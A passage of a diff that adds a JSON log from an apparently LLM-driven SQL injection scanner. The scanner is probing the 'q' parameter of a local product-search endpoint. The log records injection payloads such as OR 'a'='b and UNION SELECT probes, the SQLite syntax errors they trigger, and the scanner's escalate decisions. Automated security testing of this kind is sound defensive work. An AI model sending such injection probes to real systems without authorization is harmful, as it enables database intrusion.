+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;marker&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false,
+                "read_marker": "marker",
+                "read_marker_reflected": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='b",
+              "payload_rationale": "Repair the delimiter/parenthesis/comment shape by changing the boolean condition.",
+              "expected_signal": "SQL parser error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2091,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2085,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": -6,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='c",
+              "payload_rationale": "Add a single quote to the payload to fix the missing delimiter issue.",
+              "expected_signal": "SQL parser error with a syntax error message",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2064,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2103,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 39,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='d",
+              "payload_rationale": "Add a different character to the payload to avoid repeating the exact shape of the previous payload.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2066,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2071,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 5,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='e",
+              "payload_rationale": "Repair the delimiter/parenthesis/comment shape by adding a closing quote to the previous payload.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2056,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2083,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 27,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='g",
+              "payload_rationale": "The previous payload was rejected for repeating an already attempted payload. The next payload should contain a different value.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2087,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2087,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 0,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            }
+          ],
+          "final_decision": "escalate",
+          "strongest_decision": "escalate",
+          "stop_reason": "Max attempts reached.",
+          "confirmation_rejections": [
+            {
+              "payload": "UNION SELECT NULL, NULL",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: String/search probe rejected because it lacks a string delimiter."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "String/search probe rejected because it lacks a string delimiter.",
+                "next_step": "Return only a parameter value that includes a quote or double-quote delimiter and a harmless boolean comparison."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 954,
+                "body_changed": true,
+                "elapsed_delta_ms": -10,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;marker&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false,
+                "read_marker": "marker",
+                "read_marker_reflected": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            },
+            {
+              "payload": "UNION SELECT NULL, 'marker'",
+              "response_signal": {
+                "available": false,
+                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+              },
+              "llm_decision": {
+                "decision": "stop",
+                "confidence": 1,
+                "reason": "LLM repeated an already attempted payload.",
+                "next_step": "Choose a different endpoint-appropriate payload value."
+              }
+            }
+          ]
+        }
+      ],
+      "parameter": "q",
+      "parameter_location": "query",
+      "path_index": null,
+      "original_value": null,
+      "payload": " OR 'a'='b",
+      "payload_rationale": "Repair the delimiter/parenthesis/comment shape by changing the boolean condition.",
+      "expected_signal": "SQL parser error",
+      "observed_signal": "sql_error",
+      "evidence": "Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>       <ul id=\"stacktrace\"></ul>     </div>   </body> </html> ",
+      "baseline_status": 200,
+      "probe_status": 500
+    },
+    {
+      "method": "GET",
+      "url": "http://127.0.0.1:8080/rest/products/search",
+      "path": "/rest/products/search",
+      "endpoint_context": {
+        "endpoint_type": "search",
+        "resource": "product search results",
+        "likely_sql_context": "string_search",
+        "recommended_attack_style": "string_search_error_probe",
+        "avoid_payload_styles": [
+          "auth_bypass",
+          "numeric_probe"
+        ],
+        "probe_priority": "high",
+        "confidence": 0.8,
+        "reason": "search endpoint with query parameter"
+      },
+      "target_params": [
+        {
+          "name": "q",
+          "in": "query",
+          "endpoint_context": {
+            "endpoint_type": "search",
+            "resource": "product search results",
+            "likely_sql_context": "string_search",
+            "recommended_attack_style": "string_search_error_probe",
+            "avoid_payload_styles": [
+              "auth_bypass",
+              "numeric_probe"
+            ],
+            "probe_priority": "high",
+            "confidence": 0.8,
+            "reason": "search endpoint with query parameter"
+          },
+          "suitability": {
+            "probe": true,
+            "confidence": 0.8,
+            "reason": "search endpoint with query parameter",
+            "starting_strategy": "string_search_error_probe"
+          },
+          "payload_count": 7,
+          "attempts": [
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='a",
+              "payload_rationale": "string_search_error_probe",
+              "expected_signal": "SQL parser error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2086,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2101,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 15,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "read_confirmation",
+              "payload": "UNION SELECT NULL, 'marker'",
+              "payload_rationale": "The payload string must come from your reasoning, not from code constants. Using UNION SELECT with a harmless marker string.",
+              "expected_signal": "SQL parser/database error",
+              "expected_marker": "marker",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2098,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2088,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 984,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;marker&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 954,
+                "body_changed": true,
+                "elapsed_delta_ms": -10,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;marker&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false,
+                "read_marker": "marker",
+                "read_marker_reflected": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 0.9,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='b",
+              "payload_rationale": "Repair the delimiter/parenthesis/comment shape by changing the boolean condition.",
+              "expected_signal": "SQL parser error",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2091,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2085,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": -6,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='c",
+              "payload_rationale": "Add a single quote to the payload to fix the missing delimiter issue.",
+              "expected_signal": "SQL parser error with a syntax error message",
+              "expected_marker": "",
+              "baseline": {
+                "status_code": 200,
+                "elapsed_ms": 2064,
+                "content_type": "application/json; charset=utf-8",
+                "location": "",
+                "body_length": 30,
+                "body_sample": "{\"status\":\"success\",\"data\":[]}"
+              },
+              "probe": {
+                "status_code": 500,
+                "elapsed_ms": 2103,
+                "content_type": "text/html; charset=utf-8",
+                "location": "",
+                "body_length": 974,
+                "body_sample": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>[REDACTED_TITLE]</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing: antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1 em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size: 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n#stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n    <div id=\"wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+              },
+              "response_signal": {
+                "available": true,
+                "baseline_status": 200,
+                "probe_status": 500,
+                "status_changed": true,
+                "content_type_changed": true,
+                "body_length_delta": 944,
+                "body_changed": true,
+                "elapsed_delta_ms": 39,
+                "sql_error": true,
+                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;a&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
+                "dbms_hint": "sqlite",
+                "auth_bypass_like": false
+              },
+              "llm_decision": {
+                "decision": "escalate",
+                "confidence": 1.0,
+                "reason": "Probe response exposed a SQL parser/database error.",
+                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+              }
+            },
+            {
+              "payload_phase": "primary_probe",
+              "payload": " OR 'a'='d",
+              "payload_rationale": "Add a different character to the payload to avoid repeating the exact shape of the previous payload.",
+              "expected_signal": "SQL parser/database error",
